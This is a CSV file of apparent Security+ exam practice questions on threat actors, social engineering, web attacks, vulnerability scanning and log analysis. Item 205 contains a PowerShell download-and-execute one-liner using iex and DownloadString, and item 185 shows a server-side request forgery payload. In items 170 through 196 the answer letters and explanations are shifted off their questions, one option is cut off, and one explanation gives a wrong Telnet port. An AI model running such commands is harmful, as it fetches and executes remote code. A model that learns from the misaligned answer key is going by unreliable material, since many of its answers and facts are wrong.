Chapter,Number,Source,Value,Media,A,B,C,D,CorrectAnswer,Explanation
Objective-1,170,CH1_SEIDL,"In the United States, collaborative industry organizations that analyze and share cybersecurity threat information within their industry verticals are known by what term?",, A. IRTs, B. ISACs, C. Feedburners, D. Vertical threat feeds,B,"TCP port 23 is typically associated with Telnet, an unencrypted remote shell protocol.  Since Telnet sends its authentication and other traffic in the clear (clear/plain text), it should not be used, and Lucca should identify this as a configuration issue involving an insecure protocol."
Objective-1,171,CH1_SEIDL,"After running nmap against a system on a network, Lucca sees that TCP port 23 is open and a service is running on it. What issue should he identify?",, A. Low ports should not be open to the Internet., B. Telnet is an insecure protocol., C. SSH is an insecure protocol., D. Ports 1-1024 are well-known ports and must be firewalled.,B,"Privilege escalation attacks focus on gaining additional privileges. In this case, Cameron used physical access to the system to modify it, allowing him to then conduct a privilege escalation attack as an unprivileged user. A Trojan would have required a file to act like it was desirable, a denial-of-service attack would have prevented access to a system or service, and swapfiles (or pagefiles) are drive space used to contain the contents of memory when memory runs low. Swapfiles may contain sensitive data, but the term swapfile attack is not commonly used."
Objective-1,172,CH1_SEIDL,"During a penetration test, Cameron gains physical access to a Windows system and uses a system repair disk to copy cmd.exe to the %systemroot%\system32 directory while renaming it sethc.exe. When the system boots, he is able to log in as an unprivileged user, hit the Shift key five times, and open a command prompt with system-level access using sticky keys. What type of attack has he conducted?",, A. A Trojan attack, B. A privilege escalation attack, C. A denial-of-service attack, D. A swapfile attack,C,"Common attributes of threat actors that you should be able to describe and explain for the Security+ exam include whether they are internal or external threats, their level of sophistication or capability, their resources or funding, and their intent or motivation. The number of years of experience is difficult to determine for many threat actors and is not a direct way to gauge their capabilities, and is therefore not a common attribute that is used to assess them."
Objective-1,173,CH1_SEIDL,Adam wants to describe threat actors using common attributes. Which of the following list is not a common attribute used to describe threat actors?,, A. Internal/external, B. Resources or funding level, C. Years of experience, D. Intent/motivation,B,"Although engaging domain experts is often encouraged, requiring third-party review of proprietary algorithms is not. Many machine learning algorithms are sensitive since they are part of an organization’s competitive advantage. Ensuring that data is secure and of sufficient quality, ensuring a secure development environment, and requiring change control are all common artificial intelligence (AI)/machine learning (ML) security practices."
Objective-1,174,CH1_SEIDL,Madhuri is concerned about the security of the machine learning algorithms that her organization is deploying. Which of the following options is not a common security precaution for machine learning algorithms?,, A. Ensuring the source data is secure and of sufficient quality, B. Requiring a third-party review of all proprietary algorithms, C. Requiring change control and documentation for all changes to the algorithms," D. Ensuring a secure environment for all development, data acquisition, and storage",A,"White teams act as judges and provide oversight of cybersecurity exercises and competitions. Options B and C may remind you of white- and gray-box tests, but they’re only there to confuse you. Cybersecurity teams are usually referred to with colors like red, blue, and purple as the most common colors, as well as the white teams that the Security+ exam outline mentions. Defenders in an exercise are part of the blue team."
Objective-1,175,CH1_SEIDL,Frank is part of a white team for a cybersecurity exercise. What role will he and his team have?,, A. Performing oversight and judging of the exercise, B. Providing full details of the environment to the participants, C. Providing partial details of the environment to the participants, D. Providing defense against the attackers in the exercise,C,"Bug bounties are increasingly common and can be quite lucrative. Bug bounty websites match vulnerability researchers with organizations that are willing to pay for information about issues with their software or services. Ransoms are sometimes demanded by attackers, but this is not a ransom since it was voluntarily paid as part of a reward system. A zeroday disclosure happens when a vulnerability is disclosed and the organization has not been previously informed and allowed to fix the issue. Finally, you might feel like $10,000 is a payday, but the term is not used as a technical term and doesn’t appear on the exam."
Objective-1,176,CH1_SEIDL,"Susan receives $10,000 for reporting a vulnerability to a vendor who participates in a program to identify issues. What term is commonly used to describe this type of payment?",, A. A ransom, B. A payday, C. A bug bounty, D. A zero-day disclosure,A,"Linux privileges can be set numerically, and 777 sets user, group, and world to all have read, write, and execute access to the entire /etc directory. Setting permissions like this is a common workaround when permissions aren’t working but can expose data or make binaries executable by users who should not have access to them. When you set permissions for a system, remember to set them according to the rule of least privilege: only the permissions that are required for the role or task should be configured."
Objective-1,177,CH1_SEIDL,"Charles sets the permissions on the /etc directory on a Linux system to 777 using the chmod command. If Alex later discovers this, what should he report his finding as?",, A. Open or weak permissions, B. Improper file handling, C. A privilege escalation attack, D. None of the above,B,"Footprinting is the process of gathering information about a computer system or network, and it can involve both active and passive techniques. Mapping, fingerprinting, and aggregation are not the correct or common terms for this practice."
Objective-1,178,CH1_SEIDL,"During a penetration test, Kathleen gathers information, including the organizationâ€™s domain name, IP addresses, employee information, phone numbers, email addresses, and similar data. What is this process typically called?",, A. Mapping, B. Footprinting, C. Fingerprinting, D. Aggregation,C,"When dial-up modems were in heavy use, hackers would conduct war dialing exercises to call many phone numbers to find modems that would answer. When wireless networks became the norm, the same type of language was used, leading to terms like war walking, war driving, and even war flying. The rest of the options were made up, but you should remember that the Security+ exam expects you to know about war driving and war flying."
Objective-1,179,CH1_SEIDL,What term is used to describe mapping wireless networks while driving?,, A. Wi-driving, B. Traffic testing, C. War driving, D. CARINT,B,"Lighting and utility systems, as well as SCADA, PLCs, CNC, scientific equipment and similar devices are types of operational technology. Since this is a distributed attack that results in a denial of service, it is a distributed denial-of-service (DDoS) attack. OT systems are often isolated or otherwise protected from remote network connections to prevent this type of attack since many OT devices do not have strong security controls or frequent updates. A SCADA overflow is not a term used in the industry, but network and application DDoS attacks do appear on the Security+ exam outline, and you will need to be able to differentiate them from this type of OT DDoS."
Objective-1,180,CH1_SEIDL,"Fred discovers that the lighting and utility control systems for his company have been overwhelmed by traffic sent to them from hundreds of external network hosts. This has resulted in the lights and utility system management systems not receiving appropriate reporting, and the endpoint devices cannot receive commands. What type of attack is this?",, A. A SCADA overflow, B. An operational technology (OT) DDoS, C. A network DDoS, D. An application DDoS,C,"A false negative occurs with a vulnerability scanning system when a scan is run and an issue that exists is not identified. This can be because of a configuration option, a firewall, or other security setting or because the vulnerability scanner is otherwise unable to detect the issue. A missing vulnerability update might be a concern if the problem did not specifically state that the definitions are fully up-to-date. Unless the vulnerability is so new that there is no definition, a missing update shouldn’t be the issue. Silent patching refers to a patching technique that does not show messages to users that a patch is occurring. A false positive would have caused a vulnerability to show that was not actually there. This sometimes happens when a patch or fix is installed but the application does not change in a way that shows the change."
Objective-1,181,CH1_SEIDL,Ben runs a vulnerability scan using up-to-date definitions for a system that he knows has a vulnerability in the version of Apache that it is running. The vulnerability scan does not show that issue when he reviews the report. What has Ben encountered?,, A. A silent patch, B. A missing vulnerability update, C. A false negative, D. A false positive,A,"Refactoring a program by automated means can include adding additional text, comments, or nonfunctional operations to make the program have a different signature without changings its operations. This is typically not a manual operation due to the fact that antimalware tools can quickly find new versions. Instead, refactoring is done via a polymorphic or code mutation technique that changes the malware every time it is installed to help avoid signature-based systems."
Objective-1,182,CH1_SEIDL,What type of technique is commonly used by malware creators to change the signature of malware to avoid detection by antivirus tools?,, A. Refactoring, B. Cloning, C. Manual source code editing, D. Changing programming languages,B,"Hybrid warfare is a relatively new term that describes the multipronged attacks conducted as part of a military or national strategy of political warfare that uses traditional, asymmetric, and cyberwarfare techniques along with influence methods to achieve goals."
Objective-1,183,CH1_SEIDL,"What term describes a military strategy for political warfare that combines conventional warfare, irregular warfare, and cyberwarfare with fake news, social media influence strategies, diplomatic efforts, and manipulation of legal activities?",, A. Social warfare, B. Hybrid warfare, C. Social influence, D. Cybersocial influence campaigns,C,"This is an example of a hoax. Hoaxes are fake security threats and can consume both time and resources to combat. User awareness and good habits for validating potential hoaxes are both useful ways to prevent them from consuming more time and energy than they should. A phishing attempt would target credentials or other information, no identity information is mentioned for identity fraud here, and an invoice scam involves a fake or modified invoice."
Objective-1,184,CH1_SEIDL,Chris is notified that one of his staff was warned via a text message that the FBI is aware that they have accessed illegal websites. What type of issue is this?,, A. A phishing attempt, B. Identity fraud, C. A hoax, D. An invoice scam,B,"This is an attempt to get the server to send a request to itself as part of an API call, and it is an example of server-side request forgery. A cross-site scripting attack would use the victim’s browser rather than a server-side request, as would a CSRF attack."
Objective-1,185,CH1_SEIDL,Sarah is reviewing the logs for her web server and sees an entry flagged for review that includes the following HTTP request: CheckinstockAPI=http://localhost/admin.php What type of attack is most likely being attempted?,, A. A cross-site scripting attack, B. Server-side request forgery, C. Client-side request forgery, D. SQL injection,B,"Threat hunting can involve a variety of activities such as intelligence fusion, combining multiple data sources and threat feeds, and reviewing advisories and bulletins to remain aware of the threat environment for your organization or industry."
Objective-1,186,CH1_SEIDL,Angela reviews bulletins and advisories to determine what threats her organization is likely to face. What type of activity is this associated with?,, A. Incident response, B. Threat hunting, C. Penetration testing, D. Vulnerability scanning,C,"Passwords in memory are often stored in plain text for use. This means that attackers can recover them if they can access the memory where the password is stored, even if the storage is ephemeral."
Objective-1,187,CH1_SEIDL,Why do attackers target passwords stored in memory?,, A. They are encrypted in memory., B. They are hashed in memory., C. They are often in plain text., D. They are often de-hashed for use.,D,The AIS service uses STIX and TAXII. STIX and TAXII are open standards that the Department of Homeland Security started the development of and uses for this type of effort. You can read more about AIS here: www.us-cert.gov/ais.
Objective-1,188,CH1_SEIDL,The U.S. Department of Homeland Security (DHS) provides an automated indicator sharing (AIS) service that allows for the federal government and private sector organizations to share threat data in real time. The AIS service uses open source protocols and standards to exchange this information. Which of the following standards does the AIS service use?,, A. HTML and HTTPS, B. SFTP and XML, C. STIX and TRIX, D. STIX and TAXII,C,"The reconnaissance phase of a penetration test involves gathering information about the target, including domain information, system information, and details about employees like phone numbers, names, and email addresses."
Objective-1,189,CH1_SEIDL,"During what phase of a penetration test is information like employee names, phone number, and email addresses gathered?",, A. Exploitation, B. Establishing persistence, C. Reconnaissance, D. Lateral movement,A,"Angela has impersonated an actual employee of the delivery service to gain access to the company. Company uniforms are a very useful element for in-person social engineering.  Whaling is a type of phishing attack aimed at leaders in an organization. A watering hole attack deploys malware or other attack tools at a site or sites that a target group frequently uses. Prepending is vaguely defined by the Security+ exam but can mean a number of things.  When you see prepending on the exam, it should normally mean “adding something to the front of text.”"
Objective-1,190,CH1_SEIDL,"During a penetration test, Angela obtains the uniform of a well-known package delivery service and wears it into the target office. She claims to have a delivery for a C-level employee she knows is there and insists that the package must be signed for by that person. What social engineering technique has she used?",, A. Impersonation, B. Whaling, C. A watering hole attack, D. Prepending,D,"Acquisition via the gray market can lead to lack of vendor support, lack of warranty coverage, and the inability to validate where the devices came from. Nick should express concerns about the supply chain, and if his devices need to be from a trusted source or supplier with real support he may need to change his organization’s acquisition practices."
Objective-1,191,CH1_SEIDL,Nick purchases his network devices through a gray market supplier that imports them into his region without an official relationship with the network device manufacturer. What risk should Nick identify when he assesses his supply chain risk?,, A. Lack of vendor support, B. Lack of warranty coverage, C. Inability to validate the source of the devices, D. All of the above,B,"XML injection is often done by modifying HTTP queries sent to an XML-based web service. Reviewing web server logs to see what was sent and analyzing them for potential attacks will help Christina see if unexpected user input is visible in the logs. Syslog, authentication logs, and event logs are unlikely to contain information about web applications that would show evidence of an XML injection–based attack.  Use the following scenario for questions 193–195.  Frank is the primary IT staff member for a small company and has migrated his company’s infrastructure from an on-site datacenter to a cloud-based infrastructure as a service (IaaS) provider. Recently he has been receiving reports that his website is slow to respond and that it is inaccessible at times. Frank believes that attackers may be conducting a denial-ofservice attack against his organization."
Objective-1,192,CH1_SEIDL,Christina wants to identify indicators of attack for XML-based web applications that her organization runs. Where is she most likely to find information that can help her determine whether XML injection is occurring against her web applications?,, A. Syslog, B. Web server logs, C. Authentication logs, D. Event logs,C,"Frank’s best option is to review the anti-denial-of-service and other security tools that his cloud hosting provider provides, and to make appropriate use of them. The major infrastructure as a service (IaaS) providers have a variety of security tools that can help both detect and prevent DoS attacks from taking down sites that are hosted in their infrastructure. Calling the cloud service provider’s ISP will not work because the ISP works with the cloud provider, not with Frank! It is possible the cloud service provider might be able to assist Frank, but they are most likely to instruct him to use the existing tools that they already provide."
Objective-1,193,CH1_SEIDL,What can Frank do to determine if he is suffering from a denial-of-service (DoS) attack against his cloud hosting environment?,, A. Nothing; cloud services do not provide security tools., B. Call the cloud service provider to have them stop the DoS attack., C. Review the cloud service provider’s security tools and enable logging and anti-DoS, tools if they exist.,C,"Since Frank is using the cloud service provider’s web services, he will need to review the logs that they capture. If he has not configured them, he will need to do so, and he will then need a service or capability to analyze them for the types of traffic he is concerned about.  Syslog and Apache logs are both found on a traditional web host, and they would be appropriate if Frank was running his own web servers in the infrastructure as a service (IaaS) environment."
Objective-1,194,CH1_SEIDL,Frank is using the cloud hosting serviceâ€™s web publishing service rather than running his own web servers. Where will Frank need to look to review his logs to see what types of traffic his application is creating?,, A. Syslog, B. Apache logs, C. The cloud service’s web logs, D. None of the above,B,"The most useful data is likely to come from an IPS, or intrusion prevention system. He will be able to determine if the attack is a denial-of-service (DoS) attack, and the IPS may be able to help him determine the source of the denial-of-service attack. A firewall might provide some useful information but would only show whether or not traffic was allowed and would not analyze the traffic for attack information. A vulnerability scanner would indicate if there was an issue with his application or the server, but it would not identify this type of attack. Antimalware software can help find malware on the system but isn’t effective against a DoS attack."
Objective-1,195,CH1_SEIDL,"If Frank were still operating in his on-site infrastructure, which of the following technologies would provide the most insight into what type of attack he was seeing?",, A. A firewall, B. An IPS, C. A vulnerability scanner, D. Antimalware software,D,"Contractual terms, auditing, and security reviews are all common means of reducing third-party risks when working with a vendor that is performing systems integration work."
Objective-1,196,CH1_SEIDL,Alaina wants to ensure that the on-site system integration that a vendor that her company is working with is done in accordance with industry best practices. Which of the following is not a common method of ensuring this?,, A. Inserting security requirements into contracts,   B. Auditing configurations,   C. Coordinating with the vendor for security reviews during and after installation, D. Req,A,SOC (service organization controls) report would typically be requested if you were going to use a third-party vendor’s datacenter or hosted services.
Objective-1,197,CH1_SEIDL,Elias has implemented an AI-based network traffic analysis tool that requires him to allow the tool to monitor his network for a period of two weeks before being put into full production. What is the most significant concern he needs to address before using the AI’s baselining capabilities?,,A. The network should be isolated to prevent outbound traffic from being added to the normal traffic patterns. ,B. Compromised or otherwise malicious machines could be added to the baseline resulting in tainted training data. ,C. Traffic patterns may not match traffic throughout a longer timeframe. ,D. The AI may not understand the traffic flows in his network. ,B,Training an artificial intelligence (AI) or machine learning (ML) system with tainted data is a significant concern. Elias needs to ensure that the traffic on his network is typical and nonmalicious to ensure that the AI does not presume that malicious traffic is normal for his network.
Objective-1,198,CH1_SEIDL,What is the typical goal intent or goal of hacktivists?,,A. Increasing their reputation ,B. Financial gain ,C. Making a political statement ,D. Gathering high-value data ,C,"The most common motivation for hacktivists is to make a political statement. Reputational gains are often associated with script kiddies, whereas financial gain is most commonly a goal of organized crime or insider threats. Gathering high-value data is typical of both nation-state actors and organized crime."
Objective-1,199,CH1_SEIDL,Where does the information for predictive analysis for threat intelligence come from?,,A. Current security trends ,B. Large security datasets ,C. Behavior patterns ,D. All of the above ,D,"Predictive analysis tools use large volumes of data, including information about security trends and threats, large security datasets from various security tools and other sources, and behavior patterns, to predict and identify malicious and suspicious behavior."
Objective-1,200,CH1_SEIDL,Social Security numbers and other personal information are often stolen for what purpose?,,A. Blackmail ,B. Tailgating ,C. Identity fraud ,D. Impersonation ,C,"Identity fraud and identity theft commonly use Social Security numbers as part of the theft of identity. Tailgating involves following a person through a security door or gate so that you do not have to present credentials or a code, whereas impersonation is a social engineering technique where you claim to be someone else. Blackmail is a potential answer, but the most common usage is for identity fraud."
Objective-1,201,CH1_SEIDL,"Security orchestration, automation, and response (SOAR) tools have three major components. Which of the following is not one of those components?",,A. Source code security analysis and testing ,B. Threat and vulnerability management ,C. Security incident response ,D. Security operations automation ,A,"SOAR tools, like security information and event management (SIEM) tools, are highly focused on security operations. They include threat and vulnerability management, security incident response, and security operations and automation tools, but they do not provide source code analysis and testing tools."
Objective-1,202,CH1_SEIDL,"Direct access, wireless, email, supply chain, social media, removable media, and cloud are all examples of what?",,A. Threat intelligence sources ,B. Threat vectors ,C. Attributes of threat actors ,D. Vulnerabilities ,B,"The Security+ exam outline specifically lists these items as threat vectors. Although there are many others, you should be familiar with direct access, wireless, email, supply chain, social media, removable media, and cloud as vectors for the exam."
Objective-1,203,CH1_SEIDL,SourceForge and GitHub are both examples of what type of threat intelligence source?,,A. The dark web ,B. Automated indicator sharing sources ,C. File or code repositories ,D. Public information sharing centers ,C,"Although it may seem strange at first, both SourceForge and GitHub are used to house sample exploit code as well as other information that threat intelligence analysts may find useful. They are not part of the dark web, nor are they an automated indicator sharing (AIS) source or a public information sharing center."
Objective-1,204,CH1_SEIDL,What is the root cause of improper input handling?,,A. Improper error handling ,B. Trusting rather than validating data inputs ,C. Lack of user awareness ,D. Improper source code review ,B,"Trusting rather than validating user input is the root cause of improper input handling. All input should be considered potentially malicious and thus treated as untrusted. Appropriate filtering, validation, and testing should be performed to ensure that only valid data input is accepted and processed."
Objective-1,205,CH1_SEIDL,Claire discovers the following PowerShell script. What does it do? powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient). DownloadString('https://example.com/file.psl)),,A. Downloads a file and opens a remote shell ,B. Uploads a file and deletes the local copy ,C. Downloads a file into memory ,D. Uploads a file from memory ,C,"The code is an example of a PowerShell script that downloads a file into memory. You can rule out the upload options by reading the script since it mentions a download in the script example. Since we see a string being downloaded, rather than a file and location, you may be able to guess that this is a fileless malware example."
Objective-1,206,CH1_SEIDL,Kathleen’s IPS flags traffic from two IP addresses as shown here: \nSource IP: 10.11.94.111 \nhttp://example.com/home/show.php?SESSIONID=a3fghbby \nSource IP: 192.168.5.34 \nhttp://example.com/home/show.php?SESSIONID=a3fghbby \nWhat type of attack should she investigate this as?,,A. A SQL injection attack ,B. A cross-site scripting attack ,C. A session replay attack ,D. A server-side request forgery attack ,C,"Session IDs should be unique for distinct users and systems. A very basic type of session replay attack involves providing a victim with a session ID and then using that session ID once they have used the link and authenticated themselves. Protections such as session timeouts and encrypting session data, as well as encoding the source IP, hostname, or other identifying information in the session key, can all help prevent session replay attacks."
Objective-1,207,CH1_SEIDL,There are seven impact categories that you need to know for the Security+ exam. Which of the following is not one of them?,,A. Data breaches ,B. Data modification ,C. Data exfiltration ,D. Data loss ,B,"The Security+ exam outline lists seven major impact categories, including data loss, data breaches, and data exfiltration. Data modification is not listed, but it is a concern as part of the integrity leg of the CIA triad."
Objective-1,208,CH1_SEIDL,Which of the following research sources is typically the least timely when sourcing threat intelligence?,,A. Vulnerability feeds ,B. Local industry groups ,C. Academic journals ,D. Threat feeds ,C,"Academic journals are the slowest of the items listed because of the review processes involved with most reputable journals. Although academic journals can be useful resources, they are typically not up-to-the-minute sources. Other resources you should be aware of are vendor websites, conferences, social media, and RFCs (requests for comments)."
Objective-1,209,CH1_SEIDL,"While reviewing auth logs on a server that she maintains, Megan notices the following \nlog entries: \nApr 26 20:01:32 \nillegal port \nApr 26 20:01:48 \nillegal port \nApr 26 20:02:02 \nillegal port \nApr 26 20:02:09 \nillegal port \nApr 26 20:02:09 \nillegal port \nApr 26 20:02:35 \nillegal port \nApr 26 20:02:35 \nillegal port \n \n examplesys rshd[6101]: Connection from 10.0.2.15 on \n examplesys rshd[6117]: Connection from 10.0.2.15 on \n examplesys rshd[6167]: Connection from 10.0.2.15 on \n examplesys rshd[6170]: Connection from 10.0.2.15 on \n examplesys rshd[6172]: Connection from 10.0.2.15 on \n examplesys rshd[6188]: Connection from 10.0.2.15 on \n examplesys rlogind[6189]: Connection from 10.0.2.15 on \n \n What has she most likely detected?",,A. A successful hacking attempt ,B. A failed service startup ,C. A vulnerability scan ,D. A system reboot ,C,"Vulnerability scans and port scans can often be detected in logs by looking for a series of ports being connected to. In this case, the log was created by scanning a system with an OpenVAS scanner. There is no indication of a successful login or other hacking attempt, and a service startup would show in the messages log, not the auth log. A reboot would also show in the messages log rather than the auth log."
Objective-1,210,CH1_SEIDL,The following graphic shows a report from an OpenVAS vulnerability scan. What should Charles do first to determine the best fix for the vulnerability shown?,,A. Disable PHP-CGI. ,B. Upgrade PHP to version 5.4. ,C. Review the vulnerability descriptions in the CVEs listed. ,D. Disable the web server. ,C,"Although it may be tempting to immediately upgrade, reading and understanding the CVEs for a vulnerability is a good best practice. Once Charles understands the issue, he can then remediate it based on the recommendations for that specific problem. Disabling PHP or the web server would break the service, and in this case, only newer versions of PHP than 5.4 have the patch Charles needs."
Objective-1,211,CH1_SEIDL,"Ian runs a vulnerability scan, which notes that a service is running on TCP port 8080. What type of service is most likely running on that port?",,A. SSH ,B. RDP ,C. MySQL ,D. HTTP ,D,"Although 80 and 443 are the most common HTTP ports, it is common practice to run additional web servers on port 8080 when a nonstandard port is needed. SSH would be expected to be on port 22, RDP on 3389, and MySQL on 3306."
Objective-1,212,CH1_SEIDL,"Rick runs WPScan against a potentially vulnerable WordPress installation. WPScan is a web application security scanner designed specifically for WordPress sites. As part of the scan results, he notices the following entry:  What should Rick do after remediating this vulnerability?",,A. Install a web application firewall,B. Review the patching and updating process for the WordPress system,C. Search for other compromised systems,D. Review IPS logs for attacks against the vulnerable plug-in,B,"Once this issue is remediated, Rick should investigate why the system was running a plug-in from 2007. In many cases, when you discover a vulnerable component like this it indicates a deeper issue that exists in the organization or processes for system and application maintenance. Installing a web application firewall (WAF) or reviewing intrusion prevention system (IPS) logs may be useful if Rick thinks there are ongoing attacks or that successful attacks have occurred, but the problem does not state anything about that. There is no indication of compromise, merely a completely outdated plug-in version in the problem. If you want a sample system with vulnerable plug-ins like this to test, you can download the 2015 release of the Open Web Application Security Project (OWASP) broken web applications virtual machine. It has a wide range of completely out-of-date applications and services to practice against."
Objective-1,213,CH1_SEIDL,Carolyn runs a vulnerability scan of a network device and discovers that the device is running services on TCP ports 22 and 443. What services has she most likely discovered?,,A. Telnet and a web server ,B. FTP and a Windows fileshare ,C. SSH and a web server ,D. SSH and a Windows fileshare ,C,"A network device running SSH and a web server on TCP port 443 is a very typical discovery when running a vulnerability scan. Without any demonstrated issues, Carolyn should simply note that she saw those services. Telnet runs on port 21, an unencrypted web server will run on TCP 80 in most cases, and Windows fileshares use a variety of ports including TCP ports 135–139 and 445."
Objective-1,214,CH1_SEIDL,"Ryan needs to verify that no unnecessary ports and services are available on his systems, but he cannot run a vulnerability scanner. What is his best option?",,A. Passive network traffic capture to detect services ,B. A configuration review ,C. Active network traffic capture to detect services ,D. Log review ,B,"Configuration reviews, either using automated tool or manual validation, can be a useful proactive way to ensure that unnecessary ports and services are not accessible. Configuration management tools can also help ensure that expected configurations are in place.  Neither passive nor active network packet capture will show services that are not accessed, meaning that open ports could be missed, and log review won’t show all open ports either."
Objective-1,215,CH1_SEIDL,Why is improper error handling for web applications that results in displaying error messages considered a vulnerability that should be remediated?,,A. Errors can be used to crash the system. ,B. Many errors result in race conditions that can be exploited. ,C. Many errors provide information about the host system or its configuration. ,D. Errors can change system permissions. ,C,Errors are considered a vulnerability because they often provide additional details about the system or its configuration. They typically cannot be used to directly exploit or crash the system.
Objective-1,216,CH1_SEIDL,"Some users on your network use Acme Bank for their personal banking. Those users have all recently been the victim of an attack, in which they visited a fake Acme Bank website and their logins were compromised. They all visited the bank website from your network, and all of them insist they typed in the correct URL. What is the most likely explanation for this situation?",,A. Trojan horse ,B. IP spoofing ,C. Clickjacking ,D. DNS poisoning ,D,"This appears to be a situation where your network’s DNS server is compromised and sending people to a fake site. A Trojan horse is malware tied to a legitimate program. IP spoofing would be using a fake IP address, but that is not described in this scenario. In fact, the users are not even typing in IP addresses—they are typing in URLs. Clickjacking involves tricking users into clicking something other than what they intended."
Objective-1,217,CH1_SEIDL,John is a network administrator for Acme Company. He has discovered that someone has registered a domain name that is spelled just one letter different than his company’s domain. The website with the misspelled URL is a phishing site. What best describes this attack?,,A. Session hijacking ,B. Cross-site request forgery ,C. Typo squatting ,D. Clickjacking,C,"This is a classic example of typo squatting. The website is off by only one or two letters; the attacker hopes that users of the real website mistype the URL and are taken to their fake website. Session hijacking is taking over an authenticated session. Cross-site request forgery sends fake requests to a website that purport to be from a trusted, authenticated user. Clickjacking attempts to trick users into clicking on something other than what they intended."
,,,,,,,,,,
